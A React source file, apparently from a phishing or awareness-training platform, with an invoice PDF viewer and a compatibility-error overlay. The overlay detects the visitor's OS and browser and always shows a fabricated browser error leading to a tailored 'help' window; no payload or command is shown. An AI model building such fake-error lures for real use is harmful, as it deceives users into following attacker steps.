/** PDF shown after admin disables the compatibility error overlay. */
const SCENARIO_PDF_URL = `/upload/${encodeURIComponent(
  "Sample Invoice  Payment Scenario.pdf",
)}`;

export function FinanceScenarioPdfOverlay({
  open,
  onOpenChange,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}) {
  if (!open) {
    return null;
  }

  return (
    <div
      className="fixed inset-0 flex items-center justify-center p-4"
      style={{ zIndex: 99999 }}
    >
      <button
        type="button"
        className="absolute inset-0 bg-black/50"
        aria-label="Close scenario"
        onClick={() => onOpenChange(false)}
      />

      <div
        className="relative z-10 flex h-[min(90vh,900px)] w-full max-w-5xl flex-col overflow-hidden rounded-xl border border-[#dadce0] bg-white shadow-[0_12px_40px_rgba(0,0,0,0.35)]"
        onClick={(event) => event.stopPropagation()}
        onMouseDown={(event) => event.stopPropagation()}
      >
        <div className="flex h-11 shrink-0 items-center gap-2 border-b border-[#e8eaed] bg-[#f8f9fa] px-3">
          <p className="min-w-0 flex-1 truncate text-[13px] font-medium text-[#202124]">
            Sample Invoice / Payment Scenario
          </p>
          <a
            href={SCENARIO_PDF_URL}
            target="_blank"
            rel="noreferrer"
            className="rounded px-2.5 py-1 text-[12px] font-medium text-[#1a73e8] hover:bg-[#e8eaed]"
          >
            Open in new tab
          </a>
          <button
            type="button"
            onClick={() => onOpenChange(false)}
            className="flex h-7 w-7 items-center justify-center rounded-full text-[16px] text-[#5f6368] hover:bg-[#e8eaed]"
            aria-label="Close"
          >
            ×
          </button>
        </div>
        <iframe
          title="Sample Invoice Payment Scenario"
          src={SCENARIO_PDF_URL}
          className="h-full w-full flex-1 bg-[#525659]"
        />
      </div>
    </div>
  );
}

/** Open Scenario → loading → browser-style error. Details → browser help window. */
export function FinanceCompatibilityIssueOverlay({
  open,
  onOpenChange,
  onErrorShown,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onErrorShown?: () => void;
}) {
  const [clientOs, setClientOs] = useState<ClientOs>(() =>
    typeof window !== "undefined" ? detectClientOs() : "windows",
  );
  const [clientBrowser, setClientBrowser] = useState<ClientBrowser>(() =>
    typeof window !== "undefined" ? detectClientBrowser() : "chrome",
  );
  const [stage, setStage] = useState<OverlayStage>("loading");
  const onErrorShownRef = useRef(onErrorShown);
  onErrorShownRef.current = onErrorShown;

  useEffect(() => {
    setClientOs(detectClientOs());
    setClientBrowser(detectClientBrowser());
  }, []);

  useEffect(() => {
    if (!open) {
      setStage("loading");
      document.body.classList.remove("nm-system-error-active");
      return undefined;
    }

    document.body.classList.add("nm-system-error-active");
    setStage("loading");
    const timer = window.setTimeout(() => {
      setStage("error");
      onErrorShownRef.current?.();
    }, RENDER_DELAY_MS);

    return () => {
      window.clearTimeout(timer);
      document.body.classList.remove("nm-system-error-active");
    };
  }, [open]);

  function startRetry() {
    setStage("loading");
    window.setTimeout(() => {
      setStage("error");
      onErrorShownRef.current?.();
    }, RENDER_DELAY_MS);
  }

  if (!open) {
    return null;
  }

  return (
    <div
      className="fixed inset-0 flex items-center justify-center p-4"
      style={{ zIndex: 99999 }}
    >
      <button
        type="button"
        className="absolute inset-0 bg-black/25"
        aria-label="Dismiss"
        onClick={() => {
          if (stage !== "loading") {
            onOpenChange(false);
          }
        }}
      />

      <div
        className={`relative z-10 w-full ${
          stage === "loading"
            ? "max-w-3xl"
            : stage === "help"
              ? "max-w-[760px]"
              : "max-w-[640px]"
        }`}
        onClick={(event) => event.stopPropagation()}
        onMouseDown={(event) => event.stopPropagation()}
      >
        {stage === "loading" ? (
          <div className="flex justify-center">
            <PdfLoadingWindow browser={clientBrowser} />
          </div>
        ) : null}

        {stage === "error" ? (
          <div className="flex justify-center">
            <BrowserErrorDialog
              os={clientOs}
              browser={clientBrowser}
              onClose={() => onOpenChange(false)}
              onTryAgain={startRetry}
              onOpenHelp={() => setStage("help")}
            />
          </div>
        ) : null}

        {stage === "help" ? (
          <div className="flex justify-center">
            <BrowserHelpWindow
              os={clientOs}
              browser={clientBrowser}
              onReturn={() => onOpenChange(false)}
              onTryAgain={startRetry}
            />
          </div>
        ) : null}
      </div>
    </div>
  );
}
